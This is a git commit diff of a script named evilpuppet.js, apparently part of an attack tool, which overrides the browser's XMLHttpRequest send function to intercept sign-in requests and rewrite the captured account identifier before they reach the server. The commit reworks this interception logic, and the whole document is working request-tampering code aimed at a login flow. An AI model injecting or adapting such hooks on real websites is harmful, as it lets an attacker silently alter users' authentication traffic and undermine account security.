2541af62ebbbad212f98a3e14cc2c88665dc5595
user6417529211 <user61752921@gmail.com>
2025-03-16 12:54:15 +0000

    Update evilpuppet.js

--- evilpuppet.js
+++ evilpuppet.js
@@ -1,25 +1,19 @@
 (function() {
     const originalSend = XMLHttpRequest.prototype.send;
-    const modifiedRequests = new Set();
     const regex = /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/g;
 
     XMLHttpRequest.prototype.send = function(body) {
-        if (typeof body === "string") {
-            // If request was already modified, let it proceed
-            if (modifiedRequests.has(body)) {
-                return originalSend.call(this, body);
-            }
+        if (typeof body === "string" && regex.test(body)) {
+            console.log("Intercepting and modifying request...");
 
-            // If regex matches, modify the captured group
-            if (regex.test(body)) {
-                console.log("Modifying request payload...");
-                body = body.replace(regex, (_, captured) => 
-                    body.replace(captured, "replaced")
-                );
-                modifiedRequests.add(body); // Track modified request
-            }
+            // Modify only the captured group
+            let modifiedBody = body.replace(regex, 'identity-signin-identifier%5C%22%2C%5C%22replaced%5C');
+
+            // Manually send the modified request
+            return originalSend.call(this, modifiedBody);
         }
-        
+
+        // Send unmodified requests as usual
         return originalSend.call(this, body);
     };
 
